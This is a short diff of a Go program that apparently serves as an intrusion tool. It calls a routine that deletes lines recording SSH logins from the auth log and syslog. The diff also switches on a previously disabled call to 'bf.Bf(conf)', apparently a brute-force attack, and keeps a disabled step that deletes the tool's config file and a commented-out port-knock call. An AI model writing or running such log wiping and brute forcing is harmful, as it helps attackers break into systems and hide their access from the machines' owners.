@@ -75,9 +75,12 @@ func init() {
 	if _, err := toml.DecodeFile("config.toml", &conf); err != nil {
 		log.Fatal(err)
 	}
-	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,
+	if false { //<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<,//TODO Remove False
 		os.Remove("config.toml")
 	}
+	// if len(conf.Flags.Knock) > 0 {
+	// 	go knock.SendKnocks(conf.Server.Host, conf.Flags.Knock, 1)
+	// }
 
 }
 
@@ -119,24 +122,24 @@ func main() {
 
 				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
 
-				err = authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, dataToInfl)
-				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl)
-				fmt.Println(err)
+				err = authlog.DeleteLineAuthLogAndSyslog(vars.AUTH_LOG, dataToInfl) //
+				err = authlog.DeleteLineAuthLogAndSyslog(vars.SYSLOG, dataToInfl)   //
+				fmt.Println(err)                                                    //
 
 			}
 		}
-		if false {
-			bf.Bf(conf)
-		}
+		// if false {
+		bf.Bf(conf) //
+		// }
 	}
 
-	// time.Sleep(15 * time.Second)
+	// time.Sleep(15 * time.Second) //
 
 }
 
-func ConvertIPToBytearray(ip *string) {
+func ConvertIPToBytearray(ip *string) { //
 
-	splitIP := strings.Split(*ip, ".")
+	splitIP := strings.Split(*ip, ".") // [X]
 	for n, s := range splitIP {
 		i, err := strconv.Atoi(s)
 		if err != nil {
